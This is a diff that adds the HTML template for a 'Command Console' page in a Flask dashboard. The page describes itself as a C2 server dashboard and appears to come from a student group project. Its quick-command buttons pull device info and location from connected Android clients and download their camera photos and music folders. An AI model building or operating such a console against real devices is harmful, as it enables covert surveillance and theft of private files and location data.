@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Console - SIT Connect Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>SIT Connect Dashboard</h1>
+            <nav class="nav-tabs">
+                <a href="/" class="nav-tab">User Profiles</a>
+                <a href="/locations" class="nav-tab">Client Locations</a>
+                <a href="/console" class="nav-tab active">Command Console</a>
+            </nav>
+        </header>
+
+        <div class="main-content">
+            <!-- Client Selection Sidebar -->
+            <aside class="clients-panel-sidebar">
+                <div class="panel-header">
+                    <h2>Select Client</h2>
+                    <span id="clientCount" class="badge">0</span>
+                </div>
+                <div id="clientsList" class="clients-list">
+                    <p class="empty-message">No clients connected</p>
+                </div>
+            </aside>
+
+            <!-- Command Console -->
+            <main class="console-panel">
+                <div class="panel-header">
+                    <h2>Command Console</h2>
+                    <div id="selectedClient" class="selected-client">
+                        No client selected
+                    </div>
+                </div>
+
+                <div id="commandOutput" class="command-output">
+                    <div class="welcome-message">
+                        <p>Welcome to C2 Server Dashboard</p>
+                        <p>Select a client from the left panel to begin sending commands.</p>
+                        <p>Built with Flask + SocketIO for real-time communication</p>
+                    </div>
+                </div>
+
+                <div class="command-input-container">
+                    <input
+                        type="text"
+                        id="commandInput"
+                        class="command-input"
+                        placeholder="Enter command..."
+                        disabled
+                    >
+                    <button id="sendButton" class="send-button" disabled>Send</button>
+                    <button id="clearButton" class="clear-button">Clear</button>
+                </div>
+
+                <div class="command-suggestions">
+                    <span class="suggestion-label">Quick Commands:</span>
+                    <button class="suggestion-btn" data-cmd="ping">ping</button>
+                    <button class="suggestion-btn" data-cmd="sys_info">sys_info</button>
+                    <button class="suggestion-btn" data-cmd="location">location</button>
+                    <button class="suggestion-btn" data-cmd="ls /sdcard/">ls /sdcard/</button>
+                    <button class="suggestion-btn" data-cmd="ls /sdcard/Music/">ls /sdcard/Music/</button>
+                    <button class="suggestion-btn" data-cmd="ls /sdcard/DCIM/Camera/">ls /sdcard/DCIM/Camera/</button>
+                    <button class="suggestion-btn" data-cmd="download /sdcard/Music/">download /sdcard/Music/</button>
+                    <button class="suggestion-btn" data-cmd="download /sdcard/DCIM/Camera/">download /sdcard/DCIM/Camera/</button>
+                    <button class="suggestion-btn" data-cmd="download /sdcard/Download/helloworld.txt">download /sdcard/Download/helloworld.txt</button>
+                </div>
+            </main>
+        </div>
+
+        <footer>
+            <p>SIT Connect | By P2 Group 25 (Tristan, Bryan, Xiang Quan, Nathanael, Jarrett, Hong Liang, Chin Liong)</p>
+        </footer>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/shared.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/console.js') }}"></script>
+</body>
+</html>
